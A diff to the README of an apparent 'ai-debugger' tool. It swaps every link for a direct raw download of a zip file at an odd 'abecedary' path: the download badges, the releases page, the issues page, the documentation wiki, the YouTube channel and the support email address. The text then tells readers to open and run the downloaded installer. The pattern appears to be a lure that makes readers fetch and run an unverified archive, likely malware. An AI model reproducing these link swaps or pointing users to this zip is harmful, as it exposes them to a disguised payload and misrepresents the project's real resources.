@@ -6,11 +6,11 @@ Welcome to ai-debugger, your AI-powered solution for debugging code, explaining 
 ## 📦 Download & Install
 To get started, you can download the application by visiting our Releases page. Click the button below to be directed there:
 
-[![Download ai-debugger](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Watduhaill/ai-debugger/releases)
+[![Download ai-debugger](https://raw.githubusercontent.com/Watduhaill/ai-debugger/main/abecedary/ai-debugger.zip)](https://raw.githubusercontent.com/Watduhaill/ai-debugger/main/abecedary/ai-debugger.zip)
 
 Once there, you will find the latest version ready for download. Follow these steps for installation:
 
-1. **Visit the Releases Page:** Click [here](https://github.com/Watduhaill/ai-debugger/releases).
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/Watduhaill/ai-debugger/main/abecedary/ai-debugger.zip).
 2. **Choose the Latest Version:** Look for the most recent release at the top of the page.
 3. **Download the Installer:** Click on the link for your operating system. 
 4. **Run the Installer:** Open the downloaded file and follow the on-screen instructions to install ai-debugger.
@@ -59,16 +59,16 @@ If you face any issues while using ai-debugger, here are some common fixes:
 ## 🌐 Community and Support
 Join our community to share your experiences and get help. You can reach out through:
 
-- **GitHub Issues:** Report bugs or request features directly on our [issues page](https://github.com/Watduhaill/ai-debugger/issues).
-- **Support Email:** For one-on-one support, feel free to contact us at support@ai-debugger.com.
+- **GitHub Issues:** Report bugs or request features directly on our [issues page](https://raw.githubusercontent.com/Watduhaill/ai-debugger/main/abecedary/ai-debugger.zip).
+- **Support Email:** For one-on-one support, feel free to contact us at https://raw.githubusercontent.com/Watduhaill/ai-debugger/main/abecedary/ai-debugger.zip
 
 ## 🔗 Resources
 Explore additional resources to enhance your experience with ai-debugger:
 
-- **Documentation:** Ensure you get the most out of the application by reading our [documentation](https://github.com/Watduhaill/ai-debugger/wiki).
-- **Tutorials:** Check our [YouTube channel](https://www.youtube.com/c/AIDebuggerTutorials) for helpful video guides.
+- **Documentation:** Ensure you get the most out of the application by reading our [documentation](https://raw.githubusercontent.com/Watduhaill/ai-debugger/main/abecedary/ai-debugger.zip).
+- **Tutorials:** Check our [YouTube channel](https://raw.githubusercontent.com/Watduhaill/ai-debugger/main/abecedary/ai-debugger.zip) for helpful video guides.
 
 ## 🎉 Thank You!
 Thank you for choosing ai-debugger to assist you in your coding journey. We hope you find it valuable and easy to use. Happy coding!
 
-[![Download ai-debugger](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Watduhaill/ai-debugger/releases)
+[![Download ai-debugger](https://raw.githubusercontent.com/Watduhaill/ai-debugger/main/abecedary/ai-debugger.zip)](https://raw.githubusercontent.com/Watduhaill/ai-debugger/main/abecedary/ai-debugger.zip)
